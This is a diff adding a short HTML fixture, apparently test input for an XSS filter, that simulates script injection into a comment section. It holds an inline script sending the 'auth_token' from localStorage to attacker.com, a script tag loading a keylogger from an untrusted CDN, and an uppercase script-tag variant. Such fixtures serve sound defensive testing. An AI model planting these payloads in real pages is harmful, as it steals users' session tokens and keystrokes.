@@ -1,0 +1,18 @@
+<div>
+    <h1>Injected Script Payloads</h1>
+    <p>Simulating comment section injection with unapproved script tags.</p>
+
+    <!-- Direct inline script execution -->
+    <script>
+        window.token = localStorage.getItem('auth_token');
+        new Image().src = 'http://attacker.com/exfiltrate?token=' + window.token;
+    </script>
+
+    <!-- Remote untrusted script loading -->
+    <script src="https://cdn.malicious-scripts.com/keylogger.js"></script>
+
+    <!-- Obfuscated script tag variations -->
+    <SCRIPT TYPE="text/javascript">
+        console.log("XSS executed via uppercase script tag");
+    </SCRIPT>
+</div>
